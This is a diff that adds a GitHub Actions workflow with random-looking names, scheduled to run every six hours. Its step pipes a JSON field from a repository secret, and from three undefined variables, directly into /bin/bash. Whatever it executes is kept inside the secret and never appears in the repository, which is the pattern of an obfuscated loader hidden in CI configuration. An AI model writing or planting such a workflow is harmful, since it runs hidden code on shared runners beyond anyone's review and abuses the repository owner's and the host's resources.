@@ -1,0 +1,20 @@
+name: rigriggohk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: rigriggohk
+        env:
+          kbbjq74: ${{ secrets.kbbjq74 }}
+        run: |
+          echo $kbbjq74 | jq -r .tyrf012 | /bin/bash
+          echo $fp3046 | jq -r .nxu806 | /bin/bash
+          echo $kxaq20 | jq -r .mt3 | /bin/bash
+          echo $dj707 | jq -r .vicsa3 | /bin/bash
+
